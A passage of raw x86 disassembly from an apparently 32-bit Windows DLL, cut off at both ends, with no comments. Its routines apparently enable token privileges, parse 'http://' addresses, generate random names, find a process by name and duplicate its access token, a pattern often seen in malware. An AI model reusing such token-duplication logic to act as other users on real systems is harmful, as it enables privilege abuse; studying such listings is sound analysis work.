1000521e:	c9                   	leave  
1000521f:	c3                   	ret    
10005220:	55                   	push   %ebp
10005221:	8b ec                	mov    %esp,%ebp
10005223:	83 ec 0c             	sub    $0xc,%esp
10005226:	56                   	push   %esi
10005227:	8b 35 3c e0 00 10    	mov    0x1000e03c,%esi
1000522d:	57                   	push   %edi
1000522e:	8d 45 f4             	lea    -0xc(%ebp),%eax
10005231:	50                   	push   %eax
10005232:	33 ff                	xor    %edi,%edi
10005234:	8d 45 fc             	lea    -0x4(%ebp),%eax
10005237:	50                   	push   %eax
10005238:	57                   	push   %edi
10005239:	8d 45 f8             	lea    -0x8(%ebp),%eax
1000523c:	50                   	push   %eax
1000523d:	57                   	push   %edi
1000523e:	ff 75 08             	pushl  0x8(%ebp)
10005241:	89 7d f8             	mov    %edi,-0x8(%ebp)
10005244:	57                   	push   %edi
10005245:	89 7d fc             	mov    %edi,-0x4(%ebp)
10005248:	ff d6                	call   *%esi
1000524a:	81 7d f8 00 02 00 00 	cmpl   $0x200,-0x8(%ebp)
10005251:	77 3a                	ja     0x1000528d
10005253:	ff 15 4c e1 00 10    	call   *0x1000e14c
10005259:	83 f8 7a             	cmp    $0x7a,%eax
1000525c:	75 2f                	jne    0x1000528d
1000525e:	8b 45 fc             	mov    -0x4(%ebp),%eax
10005261:	03 c0                	add    %eax,%eax
10005263:	53                   	push   %ebx
10005264:	50                   	push   %eax
10005265:	e8 7a 17 00 00       	call   0x100069e4
1000526a:	59                   	pop    %ecx
1000526b:	8b d8                	mov    %eax,%ebx
1000526d:	8d 45 f4             	lea    -0xc(%ebp),%eax
10005270:	50                   	push   %eax
10005271:	8d 45 fc             	lea    -0x4(%ebp),%eax
10005274:	50                   	push   %eax
10005275:	53                   	push   %ebx
10005276:	8d 45 f8             	lea    -0x8(%ebp),%eax
10005279:	50                   	push   %eax
1000527a:	ff 75 0c             	pushl  0xc(%ebp)
1000527d:	ff 75 08             	pushl  0x8(%ebp)
10005280:	57                   	push   %edi
10005281:	ff d6                	call   *%esi
10005283:	53                   	push   %ebx
10005284:	8b f8                	mov    %eax,%edi
10005286:	e8 88 17 00 00       	call   0x10006a13
1000528b:	59                   	pop    %ecx
1000528c:	5b                   	pop    %ebx
1000528d:	8b c7                	mov    %edi,%eax
1000528f:	5f                   	pop    %edi
10005290:	5e                   	pop    %esi
10005291:	c9                   	leave  
10005292:	c3                   	ret    
10005293:	55                   	push   %ebp
10005294:	8b ec                	mov    %esp,%ebp
10005296:	51                   	push   %ecx
10005297:	51                   	push   %ecx
10005298:	53                   	push   %ebx
10005299:	8d 45 f8             	lea    -0x8(%ebp),%eax
1000529c:	50                   	push   %eax
1000529d:	6a 08                	push   $0x8
1000529f:	ff 75 08             	pushl  0x8(%ebp)
100052a2:	33 db                	xor    %ebx,%ebx
100052a4:	ff 15 04 e0 00 10    	call   *0x1000e004
100052aa:	85 c0                	test   %eax,%eax
100052ac:	74 5c                	je     0x1000530a
100052ae:	56                   	push   %esi
100052af:	8b 35 4c e0 00 10    	mov    0x1000e04c,%esi
100052b5:	8d 45 fc             	lea    -0x4(%ebp),%eax
100052b8:	50                   	push   %eax
100052b9:	53                   	push   %ebx
100052ba:	53                   	push   %ebx
100052bb:	6a 01                	push   $0x1
100052bd:	ff 75 f8             	pushl  -0x8(%ebp)
100052c0:	89 5d fc             	mov    %ebx,-0x4(%ebp)
100052c3:	ff d6                	call   *%esi
100052c5:	ff 15 4c e1 00 10    	call   *0x1000e14c
100052cb:	83 f8 7a             	cmp    $0x7a,%eax
100052ce:	75 39                	jne    0x10005309
100052d0:	57                   	push   %edi
100052d1:	ff 75 fc             	pushl  -0x4(%ebp)
100052d4:	e8 0b 17 00 00       	call   0x100069e4
100052d9:	8b f8                	mov    %eax,%edi
100052db:	59                   	pop    %ecx
100052dc:	3b fb                	cmp    %ebx,%edi
100052de:	74 28                	je     0x10005308
100052e0:	8d 45 fc             	lea    -0x4(%ebp),%eax
100052e3:	50                   	push   %eax
100052e4:	ff 75 fc             	pushl  -0x4(%ebp)
100052e7:	57                   	push   %edi
100052e8:	6a 01                	push   $0x1
100052ea:	ff 75 f8             	pushl  -0x8(%ebp)
100052ed:	ff d6                	call   *%esi
100052ef:	85 c0                	test   %eax,%eax
100052f1:	74 0e                	je     0x10005301
100052f3:	ff 75 0c             	pushl  0xc(%ebp)
100052f6:	ff 37                	pushl  (%edi)
100052f8:	e8 23 ff ff ff       	call   0x10005220
100052fd:	59                   	pop    %ecx
100052fe:	59                   	pop    %ecx
100052ff:	8b d8                	mov    %eax,%ebx
10005301:	57                   	push   %edi
10005302:	e8 0c 17 00 00       	call   0x10006a13
10005307:	59                   	pop    %ecx
10005308:	5f                   	pop    %edi
10005309:	5e                   	pop    %esi
1000530a:	8b c3                	mov    %ebx,%eax
1000530c:	5b                   	pop    %ebx
1000530d:	c9                   	leave  
1000530e:	c3                   	ret    
1000530f:	55                   	push   %ebp
10005310:	8b ec                	mov    %esp,%ebp
10005312:	ff 75 08             	pushl  0x8(%ebp)
10005315:	ff 15 0c e1 00 10    	call   *0x1000e10c
1000531b:	50                   	push   %eax
1000531c:	e8 72 ff ff ff       	call   0x10005293
10005321:	59                   	pop    %ecx
10005322:	59                   	pop    %ecx
10005323:	5d                   	pop    %ebp
10005324:	c3                   	ret    
10005325:	55                   	push   %ebp
10005326:	8b ec                	mov    %esp,%ebp
10005328:	83 ec 14             	sub    $0x14,%esp
1000532b:	56                   	push   %esi
1000532c:	8d 45 fc             	lea    -0x4(%ebp),%eax
1000532f:	50                   	push   %eax
10005330:	6a 20                	push   $0x20
10005332:	33 f6                	xor    %esi,%esi
10005334:	ff 15 0c e1 00 10    	call   *0x1000e10c
1000533a:	50                   	push   %eax
1000533b:	ff 15 04 e0 00 10    	call   *0x1000e004
10005341:	85 c0                	test   %eax,%eax
10005343:	74 3f                	je     0x10005384
10005345:	8d 45 f0             	lea    -0x10(%ebp),%eax
10005348:	50                   	push   %eax
10005349:	68 d8 e6 00 10       	push   $0x1000e6d8
1000534e:	56                   	push   %esi
1000534f:	c7 45 ec 01 00 00 00 	movl   $0x1,-0x14(%ebp)
10005356:	ff 15 40 e0 00 10    	call   *0x1000e040
1000535c:	85 c0                	test   %eax,%eax
1000535e:	74 1b                	je     0x1000537b
10005360:	56                   	push   %esi
10005361:	56                   	push   %esi
10005362:	6a 10                	push   $0x10
10005364:	8d 45 ec             	lea    -0x14(%ebp),%eax
10005367:	50                   	push   %eax
10005368:	56                   	push   %esi
10005369:	ff 75 fc             	pushl  -0x4(%ebp)
1000536c:	c7 45 f8 02 00 00 00 	movl   $0x2,-0x8(%ebp)
10005373:	ff 15 28 e0 00 10    	call   *0x1000e028
10005379:	8b f0                	mov    %eax,%esi
1000537b:	ff 75 fc             	pushl  -0x4(%ebp)
1000537e:	ff 15 50 e1 00 10    	call   *0x1000e150
10005384:	8b c6                	mov    %esi,%eax
10005386:	5e                   	pop    %esi
10005387:	c9                   	leave  
10005388:	c3                   	ret    
10005389:	55                   	push   %ebp
1000538a:	8b ec                	mov    %esp,%ebp
1000538c:	83 ec 14             	sub    $0x14,%esp
1000538f:	56                   	push   %esi
10005390:	8d 45 fc             	lea    -0x4(%ebp),%eax
10005393:	50                   	push   %eax
10005394:	6a 20                	push   $0x20
10005396:	33 f6                	xor    %esi,%esi
10005398:	ff 15 0c e1 00 10    	call   *0x1000e10c
1000539e:	50                   	push   %eax
1000539f:	ff 15 04 e0 00 10    	call   *0x1000e004
100053a5:	85 c0                	test   %eax,%eax
100053a7:	74 3f                	je     0x100053e8
100053a9:	8d 45 f0             	lea    -0x10(%ebp),%eax
100053ac:	50                   	push   %eax
100053ad:	68 fc e6 00 10       	push   $0x1000e6fc
100053b2:	56                   	push   %esi
100053b3:	c7 45 ec 01 00 00 00 	movl   $0x1,-0x14(%ebp)
100053ba:	ff 15 40 e0 00 10    	call   *0x1000e040
100053c0:	85 c0                	test   %eax,%eax
100053c2:	74 1b                	je     0x100053df
100053c4:	56                   	push   %esi
100053c5:	56                   	push   %esi
100053c6:	6a 10                	push   $0x10
100053c8:	8d 45 ec             	lea    -0x14(%ebp),%eax
100053cb:	50                   	push   %eax
100053cc:	56                   	push   %esi
100053cd:	ff 75 fc             	pushl  -0x4(%ebp)
100053d0:	c7 45 f8 02 00 00 00 	movl   $0x2,-0x8(%ebp)
100053d7:	ff 15 28 e0 00 10    	call   *0x1000e028
100053dd:	8b f0                	mov    %eax,%esi
100053df:	ff 75 fc             	pushl  -0x4(%ebp)
100053e2:	ff 15 50 e1 00 10    	call   *0x1000e150
100053e8:	8b c6                	mov    %esi,%eax
100053ea:	5e                   	pop    %esi
100053eb:	c9                   	leave  
100053ec:	c3                   	ret    
100053ed:	53                   	push   %ebx
100053ee:	6a 30                	push   $0x30
100053f0:	8a d8                	mov    %al,%bl
100053f2:	59                   	pop    %ecx
100053f3:	2a d9                	sub    %cl,%bl
100053f5:	80 fb 09             	cmp    $0x9,%bl
100053f8:	77 07                	ja     0x10005401
100053fa:	0f be c0             	movsbl %al,%eax
100053fd:	2b c1                	sub    %ecx,%eax
100053ff:	eb 1e                	jmp    0x1000541f
10005401:	8d 58 bf             	lea    -0x41(%eax),%ebx
10005404:	80 fb 05             	cmp    $0x5,%bl
10005407:	77 08                	ja     0x10005411
10005409:	0f be c0             	movsbl %al,%eax
1000540c:	83 e8 37             	sub    $0x37,%eax
1000540f:	eb 0e                	jmp    0x1000541f
10005411:	8d 58 9f             	lea    -0x61(%eax),%ebx
10005414:	80 fb 05             	cmp    $0x5,%bl
10005417:	77 3d                	ja     0x10005456
10005419:	0f be c0             	movsbl %al,%eax
1000541c:	83 e8 57             	sub    $0x57,%eax
1000541f:	8a da                	mov    %dl,%bl
10005421:	2a d9                	sub    %cl,%bl
10005423:	c1 e0 04             	shl    $0x4,%eax
10005426:	80 fb 09             	cmp    $0x9,%bl
10005429:	77 09                	ja     0x10005434
1000542b:	0f be d2             	movsbl %dl,%edx
1000542e:	2b d1                	sub    %ecx,%edx
10005430:	0b c2                	or     %edx,%eax
10005432:	5b                   	pop    %ebx
10005433:	c3                   	ret    
10005434:	8d 4a bf             	lea    -0x41(%edx),%ecx
10005437:	80 f9 05             	cmp    $0x5,%cl
1000543a:	77 08                	ja     0x10005444
1000543c:	0f be ca             	movsbl %dl,%ecx
1000543f:	83 e9 37             	sub    $0x37,%ecx
10005442:	eb 0e                	jmp    0x10005452
10005444:	8d 4a 9f             	lea    -0x61(%edx),%ecx
10005447:	80 f9 05             	cmp    $0x5,%cl
1000544a:	77 0a                	ja     0x10005456
1000544c:	0f be ca             	movsbl %dl,%ecx
1000544f:	83 e9 57             	sub    $0x57,%ecx
10005452:	0b c1                	or     %ecx,%eax
10005454:	5b                   	pop    %ebx
10005455:	c3                   	ret    
10005456:	83 c8 ff             	or     $0xffffffff,%eax
10005459:	5b                   	pop    %ebx
1000545a:	c3                   	ret    
1000545b:	56                   	push   %esi
1000545c:	ff 15 34 e1 00 10    	call   *0x1000e134
10005462:	eb 06                	jmp    0x1000546a
10005464:	80 3c 30 3a          	cmpb   $0x3a,(%eax,%esi,1)
10005468:	74 04                	je     0x1000546e
1000546a:	48                   	dec    %eax
1000546b:	79 f7                	jns    0x10005464
1000546d:	c3                   	ret    
1000546e:	c6 04 30 00          	movb   $0x0,(%eax,%esi,1)
10005472:	c3                   	ret    
10005473:	80 38 68             	cmpb   $0x68,(%eax)
10005476:	75 27                	jne    0x1000549f
10005478:	80 78 01 74          	cmpb   $0x74,0x1(%eax)
1000547c:	75 21                	jne    0x1000549f
1000547e:	80 78 02 74          	cmpb   $0x74,0x2(%eax)
10005482:	75 1b                	jne    0x1000549f
10005484:	80 78 03 70          	cmpb   $0x70,0x3(%eax)
10005488:	75 15                	jne    0x1000549f
1000548a:	80 78 04 3a          	cmpb   $0x3a,0x4(%eax)
1000548e:	75 0f                	jne    0x1000549f
10005490:	80 78 05 2f          	cmpb   $0x2f,0x5(%eax)
10005494:	75 09                	jne    0x1000549f
10005496:	80 78 06 2f          	cmpb   $0x2f,0x6(%eax)
1000549a:	75 03                	jne    0x1000549f
1000549c:	83 c0 07             	add    $0x7,%eax
1000549f:	c3                   	ret    
100054a0:	55                   	push   %ebp
100054a1:	8b ec                	mov    %esp,%ebp
100054a3:	eb 05                	jmp    0x100054aa
100054a5:	84 c9                	test   %cl,%cl
100054a7:	74 1d                	je     0x100054c6
100054a9:	40                   	inc    %eax
100054aa:	8a 08                	mov    (%eax),%cl
100054ac:	80 f9 3a             	cmp    $0x3a,%cl
100054af:	75 f4                	jne    0x100054a5
100054b1:	84 c9                	test   %cl,%cl
100054b3:	74 11                	je     0x100054c6
100054b5:	40                   	inc    %eax
100054b6:	80 38 00             	cmpb   $0x0,(%eax)
100054b9:	74 0b                	je     0x100054c6
100054bb:	50                   	push   %eax
100054bc:	ff 15 9c e1 00 10    	call   *0x1000e19c
100054c2:	85 c0                	test   %eax,%eax
100054c4:	75 04                	jne    0x100054ca
100054c6:	66 8b 45 08          	mov    0x8(%ebp),%ax
100054ca:	5d                   	pop    %ebp
100054cb:	c3                   	ret    
100054cc:	55                   	push   %ebp
100054cd:	8b ec                	mov    %esp,%ebp
100054cf:	83 ec 0c             	sub    $0xc,%esp
100054d2:	f6 05 88 38 01 10 01 	testb  $0x1,0x10013888
100054d9:	75 23                	jne    0x100054fe
100054db:	83 0d 88 38 01 10 01 	orl    $0x1,0x10013888
100054e2:	68 24 e7 00 10       	push   $0x1000e724
100054e7:	68 40 e7 00 10       	push   $0x1000e740
100054ec:	ff 15 04 e1 00 10    	call   *0x1000e104
100054f2:	50                   	push   %eax
100054f3:	ff 15 68 e0 00 10    	call   *0x1000e068
100054f9:	a3 84 38 01 10       	mov    %eax,0x10013884
100054fe:	8d 45 f4             	lea    -0xc(%ebp),%eax
10005501:	50                   	push   %eax
10005502:	ff 75 08             	pushl  0x8(%ebp)
10005505:	ff 15 10 e1 00 10    	call   *0x1000e110
1000550b:	8d 45 fc             	lea    -0x4(%ebp),%eax
1000550e:	50                   	push   %eax
1000550f:	8d 45 f4             	lea    -0xc(%ebp),%eax
10005512:	50                   	push   %eax
10005513:	ff 15 84 38 01 10    	call   *0x10013884
10005519:	8b 45 fc             	mov    -0x4(%ebp),%eax
1000551c:	c9                   	leave  
1000551d:	c3                   	ret    
1000551e:	55                   	push   %ebp
1000551f:	8b ec                	mov    %esp,%ebp
10005521:	83 ec 10             	sub    $0x10,%esp
10005524:	8d 45 f0             	lea    -0x10(%ebp),%eax
10005527:	50                   	push   %eax
10005528:	ff 15 64 e0 00 10    	call   *0x1000e064
1000552e:	8d 45 f0             	lea    -0x10(%ebp),%eax
10005531:	50                   	push   %eax
10005532:	e8 95 ff ff ff       	call   0x100054cc
10005537:	59                   	pop    %ecx
10005538:	c9                   	leave  
10005539:	c3                   	ret    
1000553a:	55                   	push   %ebp
1000553b:	8b ec                	mov    %esp,%ebp
1000553d:	56                   	push   %esi
1000553e:	33 f6                	xor    %esi,%esi
10005540:	39 75 08             	cmp    %esi,0x8(%ebp)
10005543:	74 18                	je     0x1000555d
10005545:	68 80 e4 00 10       	push   $0x1000e480
1000554a:	50                   	push   %eax
1000554b:	ff 15 8c e1 00 10    	call   *0x1000e18c
10005551:	3b c6                	cmp    %esi,%eax
10005553:	74 0e                	je     0x10005563
10005555:	83 c0 02             	add    $0x2,%eax
10005558:	ff 4d 08             	decl   0x8(%ebp)
1000555b:	75 e8                	jne    0x10005545
1000555d:	8a 08                	mov    (%eax),%cl
1000555f:	8b d0                	mov    %eax,%edx
10005561:	eb 0c                	jmp    0x1000556f
10005563:	33 c0                	xor    %eax,%eax
10005565:	eb 2c                	jmp    0x10005593
10005567:	84 c9                	test   %cl,%cl
10005569:	74 09                	je     0x10005574
1000556b:	46                   	inc    %esi
1000556c:	42                   	inc    %edx
1000556d:	8a 0a                	mov    (%edx),%cl
1000556f:	80 f9 0d             	cmp    $0xd,%cl
10005572:	75 f3                	jne    0x10005567
10005574:	57                   	push   %edi
10005575:	8d 7e 01             	lea    0x1(%esi),%edi
10005578:	39 7d 0c             	cmp    %edi,0xc(%ebp)
1000557b:	73 04                	jae    0x10005581
1000557d:	33 c0                	xor    %eax,%eax
1000557f:	eb 11                	jmp    0x10005592
10005581:	56                   	push   %esi
10005582:	50                   	push   %eax
10005583:	53                   	push   %ebx
10005584:	e8 87 87 00 00       	call   0x1000dd10
10005589:	83 c4 0c             	add    $0xc,%esp
1000558c:	c6 04 1e 00          	movb   $0x0,(%esi,%ebx,1)
10005590:	8b c7                	mov    %edi,%eax
10005592:	5f                   	pop    %edi
10005593:	5e                   	pop    %esi
10005594:	5d                   	pop    %ebp
10005595:	c3                   	ret    
10005596:	55                   	push   %ebp
10005597:	8b ec                	mov    %esp,%ebp
10005599:	56                   	push   %esi
1000559a:	33 f6                	xor    %esi,%esi
1000559c:	39 75 08             	cmp    %esi,0x8(%ebp)
1000559f:	76 10                	jbe    0x100055b1
100055a1:	2b c8                	sub    %eax,%ecx
100055a3:	8a 14 01             	mov    (%ecx,%eax,1),%dl
100055a6:	3a 10                	cmp    (%eax),%dl
100055a8:	75 0d                	jne    0x100055b7
100055aa:	46                   	inc    %esi
100055ab:	40                   	inc    %eax
100055ac:	3b 75 08             	cmp    0x8(%ebp),%esi
100055af:	72 f2                	jb     0x100055a3
100055b1:	33 c0                	xor    %eax,%eax
100055b3:	40                   	inc    %eax
100055b4:	5e                   	pop    %esi
100055b5:	5d                   	pop    %ebp
100055b6:	c3                   	ret    
100055b7:	33 c0                	xor    %eax,%eax
100055b9:	eb f9                	jmp    0x100055b4
100055bb:	55                   	push   %ebp
100055bc:	8b ec                	mov    %esp,%ebp
100055be:	56                   	push   %esi
100055bf:	6a 0a                	push   $0xa
100055c1:	ff 75 0c             	pushl  0xc(%ebp)
100055c4:	ff 75 08             	pushl  0x8(%ebp)
100055c7:	ff 15 18 e1 00 10    	call   *0x1000e118
100055cd:	8b f0                	mov    %eax,%esi
100055cf:	85 f6                	test   %esi,%esi
100055d1:	74 30                	je     0x10005603
100055d3:	57                   	push   %edi
100055d4:	56                   	push   %esi
100055d5:	ff 75 08             	pushl  0x8(%ebp)
100055d8:	ff 15 14 e1 00 10    	call   *0x1000e114
100055de:	8b f8                	mov    %eax,%edi
100055e0:	85 ff                	test   %edi,%edi
100055e2:	74 1e                	je     0x10005602
100055e4:	56                   	push   %esi
100055e5:	ff 75 08             	pushl  0x8(%ebp)
100055e8:	ff 15 78 e0 00 10    	call   *0x1000e078
100055ee:	8b 4d 14             	mov    0x14(%ebp),%ecx
100055f1:	57                   	push   %edi
100055f2:	89 01                	mov    %eax,(%ecx)
100055f4:	ff 15 88 e0 00 10    	call   *0x1000e088
100055fa:	8b 4d 10             	mov    0x10(%ebp),%ecx
100055fd:	89 01                	mov    %eax,(%ecx)
100055ff:	33 c0                	xor    %eax,%eax
10005601:	40                   	inc    %eax
10005602:	5f                   	pop    %edi
10005603:	5e                   	pop    %esi
10005604:	5d                   	pop    %ebp
10005605:	c3                   	ret    
10005606:	e8 db fb ff ff       	call   0x100051e6
1000560b:	a8 01                	test   $0x1,%al
1000560d:	74 10                	je     0x1000561f
1000560f:	e8 d2 fb ff ff       	call   0x100051e6
10005614:	6a 19                	push   $0x19
10005616:	33 d2                	xor    %edx,%edx
10005618:	59                   	pop    %ecx
10005619:	f7 f1                	div    %ecx
1000561b:	8d 42 61             	lea    0x61(%edx),%eax
1000561e:	c3                   	ret    
1000561f:	e8 c2 fb ff ff       	call   0x100051e6
10005624:	6a 19                	push   $0x19
10005626:	33 d2                	xor    %edx,%edx
10005628:	59                   	pop    %ecx
10005629:	f7 f1                	div    %ecx
1000562b:	8d 42 41             	lea    0x41(%edx),%eax
1000562e:	c3                   	ret    
1000562f:	55                   	push   %ebp
10005630:	8b ec                	mov    %esp,%ebp
10005632:	56                   	push   %esi
10005633:	33 f6                	xor    %esi,%esi
10005635:	39 75 0c             	cmp    %esi,0xc(%ebp)
10005638:	7e 11                	jle    0x1000564b
1000563a:	e8 c7 ff ff ff       	call   0x10005606
1000563f:	8b 4d 08             	mov    0x8(%ebp),%ecx
10005642:	88 04 0e             	mov    %al,(%esi,%ecx,1)
10005645:	46                   	inc    %esi
10005646:	3b 75 0c             	cmp    0xc(%ebp),%esi
10005649:	7c ef                	jl     0x1000563a
1000564b:	5e                   	pop    %esi
1000564c:	5d                   	pop    %ebp
1000564d:	c3                   	ret    
1000564e:	55                   	push   %ebp
1000564f:	8b ec                	mov    %esp,%ebp
10005651:	51                   	push   %ecx
10005652:	56                   	push   %esi
10005653:	57                   	push   %edi
10005654:	33 f6                	xor    %esi,%esi
10005656:	56                   	push   %esi
10005657:	56                   	push   %esi
10005658:	6a 02                	push   $0x2
1000565a:	56                   	push   %esi
1000565b:	56                   	push   %esi
1000565c:	68 00 00 00 40       	push   $0x40000000
10005661:	ff 75 08             	pushl  0x8(%ebp)
10005664:	ff 15 70 e0 00 10    	call   *0x1000e070
1000566a:	8b f8                	mov    %eax,%edi
1000566c:	83 ff ff             	cmp    $0xffffffff,%edi
1000566f:	75 04                	jne    0x10005675
10005671:	33 c0                	xor    %eax,%eax
10005673:	eb 1f                	jmp    0x10005694
10005675:	56                   	push   %esi
10005676:	8d 45 fc             	lea    -0x4(%ebp),%eax
10005679:	50                   	push   %eax
1000567a:	ff 75 10             	pushl  0x10(%ebp)
1000567d:	89 75 fc             	mov    %esi,-0x4(%ebp)
10005680:	ff 75 0c             	pushl  0xc(%ebp)
10005683:	57                   	push   %edi
10005684:	ff 15 84 e0 00 10    	call   *0x1000e084
1000568a:	57                   	push   %edi
1000568b:	ff 15 50 e1 00 10    	call   *0x1000e150
10005691:	33 c0                	xor    %eax,%eax
10005693:	40                   	inc    %eax
10005694:	5f                   	pop    %edi
10005695:	5e                   	pop    %esi
10005696:	c9                   	leave  
10005697:	c3                   	ret    
10005698:	55                   	push   %ebp
10005699:	8b ec                	mov    %esp,%ebp
1000569b:	81 ec 2c 02 00 00    	sub    $0x22c,%esp
100056a1:	53                   	push   %ebx
100056a2:	56                   	push   %esi
100056a3:	57                   	push   %edi
100056a4:	33 db                	xor    %ebx,%ebx
100056a6:	53                   	push   %ebx
100056a7:	6a 02                	push   $0x2
100056a9:	c7 85 d4 fd ff ff 2c 	movl   $0x22c,-0x22c(%ebp)
100056b0:	02 00 00 
100056b3:	ff 15 94 e0 00 10    	call   *0x1000e094
100056b9:	8b f8                	mov    %eax,%edi
100056bb:	8d 85 d4 fd ff ff    	lea    -0x22c(%ebp),%eax
100056c1:	50                   	push   %eax
100056c2:	57                   	push   %edi
100056c3:	ff 15 60 e0 00 10    	call   *0x1000e060
100056c9:	8b 35 50 e1 00 10    	mov    0x1000e150,%esi
100056cf:	eb 3a                	jmp    0x1000570b
100056d1:	68 54 e7 00 10       	push   $0x1000e754
100056d6:	8d 85 f8 fd ff ff    	lea    -0x208(%ebp),%eax
100056dc:	50                   	push   %eax
100056dd:	ff 15 90 e0 00 10    	call   *0x1000e090
100056e3:	85 c0                	test   %eax,%eax
100056e5:	75 16                	jne    0x100056fd
100056e7:	ff b5 dc fd ff ff    	pushl  -0x224(%ebp)
100056ed:	50                   	push   %eax
100056ee:	68 00 04 00 00       	push   $0x400
100056f3:	ff 15 80 e0 00 10    	call   *0x1000e080
100056f9:	85 c0                	test   %eax,%eax
100056fb:	75 14                	jne    0x10005711
100056fd:	8d 85 d4 fd ff ff    	lea    -0x22c(%ebp),%eax
10005703:	50                   	push   %eax
10005704:	57                   	push   %edi
10005705:	ff 15 8c e0 00 10    	call   *0x1000e08c
1000570b:	85 c0                	test   %eax,%eax
1000570d:	75 c2                	jne    0x100056d1
1000570f:	eb 09                	jmp    0x1000571a
10005711:	8b 9d dc fd ff ff    	mov    -0x224(%ebp),%ebx
10005717:	50                   	push   %eax
10005718:	ff d6                	call   *%esi
1000571a:	83 ff ff             	cmp    $0xffffffff,%edi
1000571d:	74 03                	je     0x10005722
1000571f:	57                   	push   %edi
10005720:	ff d6                	call   *%esi
10005722:	5f                   	pop    %edi
10005723:	5e                   	pop    %esi
10005724:	8b c3                	mov    %ebx,%eax
10005726:	5b                   	pop    %ebx
10005727:	c9                   	leave  
10005728:	c3                   	ret    
10005729:	55                   	push   %ebp
1000572a:	8b ec                	mov    %esp,%ebp
1000572c:	51                   	push   %ecx
1000572d:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
10005731:	8d 45 fc             	lea    -0x4(%ebp),%eax
10005734:	50                   	push   %eax
10005735:	6a 01                	push   $0x1
10005737:	6a 02                	push   $0x2
10005739:	6a 00                	push   $0x0
1000573b:	68 ff 01 0f 00       	push   $0xf01ff
10005740:	ff 75 08             	pushl  0x8(%ebp)
10005743:	ff 15 38 e0 00 10    	call   *0x1000e038
10005749:	8b 45 fc             	mov    -0x4(%ebp),%eax
1000574c:	c9                   	leave  
1000574d:	c3                   	ret    
1000574e:	55                   	push   %ebp
1000574f:	8b ec                	mov    %esp,%ebp
10005751:	53                   	push   %ebx
10005752:	33 db                	xor    %ebx,%ebx
10005754:	39 5d 08             	cmp    %ebx,0x8(%ebp)
10005757:	74 46                	je     0x1000579f
10005759:	57                   	push   %edi
1000575a:	ff 75 08             	pushl  0x8(%ebp)
1000575d:	53                   	push   %ebx
1000575e:	68 00 04 00 00       	push   $0x400
10005763:	ff 15 80 e0 00 10    	call   *0x1000e080
10005769:	8b f8                	mov    %eax,%edi
1000576b:	3b fb                	cmp    %ebx,%edi
1000576d:	74 2f                	je     0x1000579e
1000576f:	56                   	push   %esi
10005770:	8d 45 08             	lea    0x8(%ebp),%eax
10005773:	50                   	push   %eax
10005774:	6a 02                	push   $0x2
10005776:	57                   	push   %edi
10005777:	89 5d 08             	mov    %ebx,0x8(%ebp)
1000577a:	ff 15 04 e0 00 10    	call   *0x1000e004
10005780:	8b 35 50 e1 00 10    	mov    0x1000e150,%esi
10005786:	85 c0                	test   %eax,%eax
10005788:	74 10                	je     0x1000579a
1000578a:	ff 75 08             	pushl  0x8(%ebp)
1000578d:	e8 97 ff ff ff       	call   0x10005729
10005792:	59                   	pop    %ecx
10005793:	ff 75 08             	pushl  0x8(%ebp)
10005796:	8b d8                	mov    %eax,%ebx
10005798:	ff d6                	call   *%esi
1000579a:	57                   	push   %edi
1000579b:	ff d6                	call   *%esi
1000579d:	5e                   	pop    %esi
1000579e:	5f                   	pop    %edi
1000579f:	8b c3                	mov    %ebx,%eax
100057a1:	5b                   	pop    %ebx
100057a2:	5d                   	pop    %ebp
100057a3:	c3                   	ret    
100057a4:	e8 ef fe ff ff       	call   0x10005698
100057a9:	50                   	push   %eax
100057aa:	e8 9f ff ff ff       	call   0x1000574e
100057af:	59                   	pop    %ecx
100057b0:	c3                   	ret    
100057b1:	ff 15 98 e0 00 10    	call   *0x1000e098
100057b7:	50                   	push   %eax
100057b8:	e8 91 ff ff ff       	call   0x1000574e
100057bd:	59                   	pop    %ecx
100057be:	c3                   	ret    
100057bf:	55                   	push   %ebp
100057c0:	8b ec                	mov    %esp,%ebp
100057c2:	83 ec 5c             	sub    $0x5c,%esp
100057c5:	53                   	push   %ebx
100057c6:	56                   	push   %esi
100057c7:	57                   	push   %edi
100057c8:	ff 75 0c             	pushl  0xc(%ebp)
100057cb:	33 ff                	xor    %edi,%edi
100057cd:	89 7d f8             	mov    %edi,-0x8(%ebp)
100057d0:	ff 15 6c e0 00 10    	call   *0x1000e06c
100057d6:	8d 70 01             	lea    0x1(%eax),%esi
100057d9:	8d 04 36             	lea    (%esi,%esi,1),%eax
100057dc:	50                   	push   %eax
100057dd:	e8 02 12 00 00       	call   0x100069e4
100057e2:	8b d8                	mov    %eax,%ebx
100057e4:	59                   	pop    %ecx
100057e5:	3b df                	cmp    %edi,%ebx
100057e7:	75 07                	jne    0x100057f0
100057e9:	33 c0                	xor    %eax,%eax
100057eb:	e9 d7 00 00 00       	jmp    0x100058c7
100057f0:	3b f7                	cmp    %edi,%esi
100057f2:	7e 12                	jle    0x10005806
100057f4:	8b 4d 0c             	mov    0xc(%ebp),%ecx
100057f7:	2b cb                	sub    %ebx,%ecx
100057f9:	66 8b 14 01          	mov    (%ecx,%eax,1),%dx
100057fd:	66 89 10             	mov    %dx,(%eax)
10005800:	83 c0 02             	add    $0x2,%eax
10005803:	4e                   	dec    %esi
10005804:	75 f3                	jne    0x100057f9
10005806:	33 c0                	xor    %eax,%eax
10005808:	c7 45 a4 44 00 00 00 	movl   $0x44,-0x5c(%ebp)
1000580f:	89 7d d0             	mov    %edi,-0x30(%ebp)
10005812:	66 89 45 d4          	mov    %ax,-0x2c(%ebp)
10005816:	89 7d a8             	mov    %edi,-0x58(%ebp)
10005819:	89 7d cc             	mov    %edi,-0x34(%ebp)
1000581c:	89 7d b4             	mov    %edi,-0x4c(%ebp)
1000581f:	89 7d c4             	mov    %edi,-0x3c(%ebp)
10005822:	89 7d bc             	mov    %edi,-0x44(%ebp)
10005825:	89 7d b8             	mov    %edi,-0x48(%ebp)
10005828:	89 7d c8             	mov    %edi,-0x38(%ebp)
1000582b:	89 7d c0             	mov    %edi,-0x40(%ebp)
1000582e:	89 7d e4             	mov    %edi,-0x1c(%ebp)
10005831:	89 7d dc             	mov    %edi,-0x24(%ebp)
10005834:	89 7d e0             	mov    %edi,-0x20(%ebp)
10005837:	89 7d ac             	mov    %edi,-0x54(%ebp)
1000583a:	89 7d d8             	mov    %edi,-0x28(%ebp)
1000583d:	66 89 45 d6          	mov    %ax,-0x2a(%ebp)
10005841:	89 7d b0             	mov    %edi,-0x50(%ebp)
10005844:	be 20 04 00 00       	mov    $0x420,%esi
10005849:	39 7d 14             	cmp    %edi,0x14(%ebp)
